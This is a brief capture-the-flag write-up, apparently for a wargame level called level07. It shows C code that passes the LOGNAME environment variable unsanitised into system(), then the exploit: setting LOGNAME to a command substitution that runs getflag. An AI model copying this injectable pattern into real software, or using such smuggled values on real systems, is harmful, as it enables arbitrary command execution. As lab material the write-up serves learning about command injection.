after you look into the executable, you see that the code looks something like that

```C
asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
return system(buffer);
```

so once you run `LOGNAME=$\(getflag\) ./level07`, getflag gets called by the system funktion.
